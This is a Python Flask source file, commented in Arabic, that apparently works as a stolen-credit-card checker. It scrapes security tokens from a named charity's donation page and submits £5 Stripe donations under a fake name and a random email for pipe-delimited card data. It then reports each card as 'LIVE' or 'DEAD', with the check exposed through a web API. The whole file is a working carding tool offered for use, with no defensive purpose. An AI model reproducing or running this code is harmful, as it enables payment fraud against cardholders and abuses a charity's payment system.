import requests
import re
import time
import random
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# ترويسات قوية لمحاكاة المتصفح
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Origin': 'https://ummahappeal.org',
    'Referer': 'https://ummahappeal.org/donate/'
}

def check_card_gate(cc_data):
    session = requests.Session()
    try:
        # 1. جلب التوكنات الأمنية (Nonce)
        res = session.get("https://ummahappeal.org/donate/", headers=HEADERS, timeout=15)
        nonce = re.search(r'give-nonce" value="(.*?)"', res.text).group(1)
        form_id = re.search(r'give-form-id" value="(.*?)"', res.text).group(1)
        
        # 2. تقطيع بيانات البطاقة
        n, m, y, c = cc_data.split('|')
        full_year = f"20{y}" if len(y) == 2 else y

        # 3. تجهيز بيانات التبرع
        payload = {
            'give-form-id': form_id,
            'give-nonce': nonce,
            'give-amount': '5.00', # الحد الأدنى
            'give_first': 'Ahmed',
            'give_last': 'Hunter',
            'give_email': f'hunter{random.randint(100,999)}@gmail.com',
            'card_number': n.strip(),
            'card_cvc': c.strip(),
            'card_exp_month': m.strip(),
            'card_exp_year': full_year.strip(),
            'give_action': 'purchase',
            'gateway': 'stripe',
            'give_ajax': '1'
        }

        # 4. إرسال الطلب
        response = session.post("https://ummahappeal.org/donate/?payment-mode=stripe", data=payload, headers=HEADERS)
        
        if "thank you" in response.text.lower() or "success" in response.text:
            return {"status": "LIVE", "msg": "Approved £5.00 ✅"}
        elif "insufficient" in response.text.lower():
            return {"status": "LIVE", "msg": "Insufficient Funds 💰"}
        else:
            return {"status": "DEAD", "msg": "Declined ❌"}
            
    except Exception as e:
        return {"status": "ERROR", "msg": "Site Blocked or Connection Error"}

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/api/check', methods=['POST'])
def api_check():
    cc = request.json.get('cc')
    return jsonify(check_card_gate(cc))

if __name__ == "__main__":
    import os
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
